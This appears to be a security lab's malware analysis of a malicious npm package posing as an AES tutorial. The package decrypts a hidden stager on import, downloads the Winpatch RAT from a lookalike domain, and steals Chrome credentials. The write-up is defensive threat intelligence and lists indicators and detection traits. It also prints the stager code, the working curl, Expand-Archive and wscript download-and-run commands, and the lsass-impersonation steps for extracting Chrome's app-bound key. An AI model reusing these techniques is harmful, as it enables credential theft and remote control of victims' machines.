---
title: "aes-decode-runner-pro: an 'AES demo' that decrypts itself into a RAT"
date: 2026-05-27
summary: "A tutorial-shaped AES codec whose import decrypts its own hardcoded ciphertext, pulls a 6 MB payload from nvidiadriver.net, and unpacks the Winpatch RAT — which impersonates lsass.exe to lift Chrome's app-bound encryption keys."
packageName: aes-decode-runner-pro
ecosystem: npm
---

Dressed up as an AES-GCM tutorial library — two real codec deps wired in so the math actually works — `aes-decode-runner-pro` fires its chain the moment you `require()` it:

<pre class="lang-js"><code><span class="tok-com">// index.js</span>
<span class="tok-kw">const</span> pkg = <span class="tok-builtin">require</span>(<span class="tok-str">"./custom-codec"</span>);
pkg.<span class="tok-fn">run</span>();
module.exports = pkg;
</code></pre>

`run` pulls a 6 KB AES-GCM ciphertext and key material out of `defaults.js`:

| Variable | Value |
| --- | --- |
| Ciphertext | `DEFAULT_FINAL_ENCODED_TEXT` (6 KB) |
| Passphrase | `default-dev-passphrase` |
| Salt | `encode-npm-c-salt` |
| KDF | scrypt |

then peels three reversed codec layers and hands the plaintext to `new Function("require", runnable)(require)` — `eval` with one indirection, so a static reader's eye slides off it.

- `aes-256-gcm`
- `encode-decode-codec`
- `position-unit-codec`

The decrypted JS is a self-deleting PowerShell stager:

<pre class="lang-js"><code><span class="tok-kw">const</span> key = <span class="tok-str">"AB59097(*^^zxcvbn"</span>;
<span class="tok-kw">const</span> number = <span class="tok-str">"69 52 42 52 105 59 38 42 113 152 …"</span>; <span class="tok-com">// 224 ints</span>
<span class="tok-com">// per-byte: k = key[j]+103; out = k &gt;= num ? k - num : num</span>
fs.<span class="tok-fn">writeFileSync</span>(<span class="tok-str">"settings.ps1"</span>, decoded);
<span class="tok-builtin">require</span>(<span class="tok-str">"child_process"</span>).<span class="tok-fn">exec</span>(<span class="tok-str">'powershell -ExecutionPolicy Bypass -File ./settings.ps1'</span>)
  .<span class="tok-fn">on</span>(<span class="tok-str">"exit"</span>, () =&gt; fs.<span class="tok-fn">unlinkSync</span>(<span class="tok-str">"settings.ps1"</span>));
</code></pre>

Its three operative lines:

<pre class="lang-ps1"><code>curl.exe -k -o "$env:TEMP\winPatch.zip" http://nvidiadriver.net/verv1432/winpatch-bd9e.win
Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP\winPatch"
wscript "$env:TEMP\winPatch\update.vbs"
</code></pre>

The 6 MB zip ships a complete CPython 3.10 runtime plus three Nuitka-compiled `.pyd` modules whose compressed constants hide the C2 URL — yet `cleave analyze` still fires twelve `winpatch` rules off the leftover Unicode constant table:

- `chost.exe` — `python.exe` unmodified, PDB `D:\_w\1\b\bin\amd64\python.pdb`, PSF cert intact
- Three `.pyd` modules — confirmed Nuitka by their constants:
  - `__nuitka_version__`
  - `__compiled__`
  - `PyMarshal_ReadObjectFromString`

**`audiodriver.cp310-win_amd64.pyd` — the RAT dispatcher**, every constant stamped with the `0825` campaign tag:

| Constant | Role |
| --- | --- |
| `SVR0825URL` | C2 endpoint passed into `api.htxp0825Exchange` |
| `MACHINE0825HOST`, `genUUID0825`, `PID0825NAME` | host / install / process fingerprint |
| `DURATION0825ERROR_WAIT` | backoff between failed exchanges |
| `REG0825PATH`, `REG0825KEY` → `regStartup` | `HKEY_CURRENT_USER\…\Run` → `wscript.exe "…update.vbs"` |
| `COMMAND0825{AUTO,EXIT,INFORMATION,TERMINAL,FILE_UPLOAD,FILE_DOWNLOAD,WAIT}` | seven verbs, dispatched to matching `process0825*` handlers |
| `AUTO0825CHROME_COOKIE` | parameter passed to `auto.pyd` when `COMMAND0825AUTO` fires |

**`api.cp310-win_amd64.pyd` — the `htxp` transport**, an ARC4-encrypted, MD5-checksummed body POSTed as `application/octet-stream`:

| Constant | Role |
| --- | --- |
| `packet0825make`, `packet0825decode` | encode/decode the wire frame |
| `Crypto.Cipher.ARC4.new`, `.encrypt` / `.decrypt` | symmetric body cipher |
| `hashlib.md5`, `.digest`, `SUM_LENGTH` | per-packet checksum |
| `requests.post`, `Content-Type: application/octet-stream` | HTTP carrier |
| `urandom`, `KEY_LENGTH` | per-session ARC4 key |

**`auto.cp310-win_amd64.pyd` — the Chrome ABE stealer**, the part most npm-dropped stealers skip: to reach the SYSTEM-scoped v20 app-bound key it impersonates `lsass.exe`, then decrypts three browser stores and hands the loot back over `htxp`.

1. Enable `SeDebugPrivilege`
2. Open `lsass.exe`
3. Duplicate its primary token
4. Call `NCryptOpenKey("Google Chromekey1")` under that impersonation
5. Use the returned key to unwrap `app_bound_encrypted_key` from `Local State`

- `Login Data` (saved-logins SQLite)
- the cookie database
- `Local Extension Settings` (where browser-wallet extensions live)

| Constant | Role |
| --- | --- |
| `aSeDebugPrivilege`, `aTokenImpersonation`, `aSecurityImpersonation` | SYSTEM elevation primitives |
| `alssass_token`, `aimppersonation_token` | family-unique typos cleave keys off |
| `aNCryptOpenStorageProvider("Microsoft Software Key Storage Provider")` | CNG handle |
| `aNCryptOpenKey("Google Chromekey1")` | Chrome's named ABE key |
| `app_bound_encrypted_key`, `axor_key` | `Local State` field + XOR-wrap step |
| `SELECT origin_url, username_value, password_value, date_created FROM logins` | `Login Data` SQLite read |
| `aautoCookieMode`, `aautoGatherMode`, `azipDirectories` | cookies + `Local Extension Settings` (wallets) packaged |
| `uchrome_logins_dump.txt`, `uChrome Saved Logins Dump` | output filename + banner |

Winpatch used to arrive via cracked-software lures and fake installers; seeing its `0825` tooling ride npm instead means a small JavaScript front-end is now a comfortable enough place to hide a Windows native stealer.

## Traits observed

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/install-hook/library/import-time-eval` | `require()` of the package calls `pkg.run()` → `new Function("require", …)(require)` on a decrypted blob |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/encoding/aes-gcm-static-key` | Stage-1 JS is `aes-256-gcm` with passphrase, salt, and ciphertext all hardcoded in `defaults.js` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/execution/network-stage/curl-powershell-vbs` | `curl.exe -k` → `Expand-Archive` → `wscript update.vbs` chain written by the decrypted stager |
| <span class="sev-dot hostile" title="hostile"></span> | `well-known/malware/rat/winpatch` | Winpatch RAT family — cleave matches twelve campaign rules (`campaign-htxp-exchange`, `svr-url-key`, `campaign-uuid-helper`, six `cmd-*`, `chrome-cookie-task`, `stealer-cookie-dump-banner`, `stealer-dump-filename`) plus `stealer-lssass-typo` and `stealer-impersonation-typo` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/credential-access/browser/chromium/app-bound-key-theft` | `aNCryptOpenStorageProvider("Microsoft Software Key Storage Provider")` → `aNCryptOpenKey("Google Chromekey1")` → `app_bound_encrypted_key` + `xor_key`, gated by `SeDebugPrivilege` + `lsass.exe` token impersonation |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/browser/chrome-login-data-sqlite` | `SELECT origin_url, username_value, password_value, date_created FROM logins` → `chrome_logins_dump.txt` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/remote-access/custom-protocol/arc4-md5` | `htxp0825Exchange` posts ARC4-encrypted, MD5-checksummed `application/octet-stream` bodies to `SVR0825URL` with seven `COMMAND0825…` verbs |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/persistence/login/registry/autostart` | `HKCU\…\Run` writes `wscript.exe …update.vbs` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/packing/nuitka/standalone` | Three `.pyd` modules with `__nuitka_version__`, `__compiled__`, `PyMarshal_ReadObjectFromString`; constants hidden in compressed blob |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/masquerade/identity/legitimate-binary` | `chost.exe` is unmodified CPython 3.10 `python.exe` renamed (PDB `python.pdb`, PSF cert string) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/infrastructure/typosquat-domain` | `nvidiadriver.net` lookalike on Hetzner, Express + helmet front-end serving `winpatch-bd9e.win` as `win-driver-bd9e.zip` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/evasion/self-delete/file/script` | `fs.unlinkSync("settings.ps1")` on the stager's `exit` event |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | Empty `author`, no repo URL, 10 versions in 24 h, declared `start`/`test`/`decode` scripts all point at a `crypto/lib.min.js` not shipped in the tarball |

## Indicators

| Type | Value |
| --- | --- |
| Package | `aes-decode-runner-pro@1.0.9` (npm) |
| npm page | [npmjs.com/package/aes-decode-runner-pro](https://www.npmjs.com/package/aes-decode-runner-pro) |
| Published | `2026-05-26T16:24:58Z` (`1.0.10` followed 19 min later) |
| Tarball SHA-256 | [`b7ebd4ee16d33e8210f48b3f2b1ef8e894d9726ee4d687c7e9a6c4d1b3043b40`](https://lab.atomdrift.org/file/b7ebd4ee16d33e8210f48b3f2b1ef8e894d9726ee4d687c7e9a6c4d1b3043b40) |
| Tarball SHA-1 (npm `shasum`) | `44add86a440f1c2928604298f0f8e49685d5086a` |
| `src/config/defaults.js` SHA-256 | [`1a7ab170e96f20a25eba56b9fcecee5cf4e49ba51533f5504f40e48ec52161de`](https://lab.atomdrift.org/file/1a7ab170e96f20a25eba56b9fcecee5cf4e49ba51533f5504f40e48ec52161de) |
| AES key material | passphrase `default-dev-passphrase`, salt `encode-npm-c-salt`, scrypt → aes-256-gcm |
| XOR key (Stage-2 PS1) | `AB59097(*^^zxcvbn` (`k = key[j]+103; out = k≥n ? k-n : n`) |
| Stage-2 URL | `http://nvidiadriver.net/verv1432/winpatch-bd9e.win` → `95.216.92.207` (Hetzner) |
| Stage-2 zip SHA-256 | [`ddd5bd20fd92d4671073096c3e9230e9d3465588f6f7db0abb9618ed3339312a`](https://lab.atomdrift.org/file/ddd5bd20fd92d4671073096c3e9230e9d3465588f6f7db0abb9618ed3339312a) (6,016,747 B) |
| `chost.exe` SHA-256 | [`94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954`](https://lab.atomdrift.org/file/94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954) (CPython 3.10 `python.exe`) |
| `api.cp310-win_amd64.pyd` SHA-256 | [`50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf`](https://lab.atomdrift.org/file/50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf) |
| `audiodriver.cp310-win_amd64.pyd` SHA-256 | [`164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3`](https://lab.atomdrift.org/file/164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3) |
| `auto.cp310-win_amd64.pyd` SHA-256 | [`17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871`](https://lab.atomdrift.org/file/17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871) |
| Persistence | `HKCU\…\Run` → `wscript.exe "$env:TEMP\winPatch\update.vbs"` |
| Family | Winpatch (cleave `well-known/malware/rat/winpatch`, traits revision `52c161754`) |
| Family fingerprints | Typo identifiers `lssass_token` and `imppersonation_token`; `0825` campaign tag on every command, transport, and helper constant; `htxp0825Exchange` ARC4+MD5 wire format |
| Publisher | `abdrizak <aabdirizak13@gmail.com>` |
